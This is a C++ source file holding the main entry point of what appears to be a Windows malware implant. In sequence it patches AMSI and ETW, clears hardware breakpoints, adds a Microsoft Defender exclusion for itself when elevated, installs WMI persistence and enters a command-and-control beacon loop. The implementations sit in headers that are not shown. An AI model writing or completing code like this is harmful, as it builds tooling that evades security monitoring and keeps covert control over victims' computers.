#include <windows.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Disable error dialogs
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    // Initialize syscalls (must be first)
    if (!InitializeSyscalls()) {
        // Fallback to normal APIs? Better to exit or retry.
        return 1;
    }

    // Apply initial evasion
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();

    // Optional: add Defender exclusion if elevated
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (IsElevated()) {
        AddDefenderExclusion(exePath);
    }

    // Install WMI persistence (only if not already)
    if (!IsWmiPersistenceInstalled()) {
        InstallWmiPersistence(exePath);
    }

    // Enter C2 beacon loop
    BeaconLoop();

    return 0;
}